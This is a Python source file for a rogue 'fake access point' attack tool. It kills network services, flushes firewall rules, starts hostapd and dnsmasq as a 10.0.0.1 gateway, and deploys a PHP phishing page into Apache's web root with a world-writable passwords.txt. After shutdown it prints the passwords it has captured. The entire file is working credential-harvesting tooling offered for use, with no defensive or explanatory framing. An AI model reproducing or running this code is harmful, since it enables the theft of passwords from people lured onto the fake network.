import os
import signal
import time



def reset_setting():
    os.system('service NetworkManager start')
    os.system('service apache2 stop')
    os.system('service hostapd stop')
    os.system('service dnsmasq stop')
    #os.system('service rpcbind stop')
    os.system('killall dnsmasq >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')
    os.system('systemctl enable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl start systemd-resolved >/dev/null 2>&1')

def AP_on(iface):
    os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
    os.system('systemctl stop systemd-resolved >/dev/null 2>&1')
    os.system('service NetworkManager stop')
    os.system(' pkill -9 hostapd')
    os.system(' pkill -9 dnsmasq')
    os.system(' pkill -9 wpa_supplicant')
    os.system(' pkill -9 avahi-daemon')
    os.system(' pkill -9 dhclient')
    os.system('killall dnsmasq >/dev/null 2>&1')
    os.system('killall hostapd >/dev/null 2>&1')
    os.system("ifconfig "+ iface +" 10.0.0.1 netmask 255.255.255.0")
    #os.system('route add default gw 10.0.0.1')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system('iptables --flush')
    os.system('iptables --table nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')
    os.system('iptables -P FORWARD ACCEPT')

def run_AP():
	os.system('dnsmasq -C dnsmasq.conf')
	#os.system('route add default gw 10.0.0.1')
	os.system('hostapd hostapd.conf -B')
	os.system('route add default gw 10.0.0.1')

def start_apache():
    os.system('service apache2 start')
    os.system('route add default gw 10.0.0.1')
    os.system('cp html/index.php /var/www/html/')
    os.system('cp html/pass.php /var/www/html/')
    os.system('cp html/passwords.txt /var/www/html/')
    os.system('cp -r html/css /var/www/html/')
    os.system('cp -r html/js /var/www/html/')
    os.system('cp -r html/images /var/www/html/')
    os.system('chmod 777 /var/www/html/passwords.txt')


	

def start(iface):
    reset_setting()
    AP_on(iface)
    start_apache()
    run_AP()
    empty = raw_input("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")
    reset_setting()
    os.system("clear")
    os.system("cat /var/www/html/passwords.txt")

    
	
	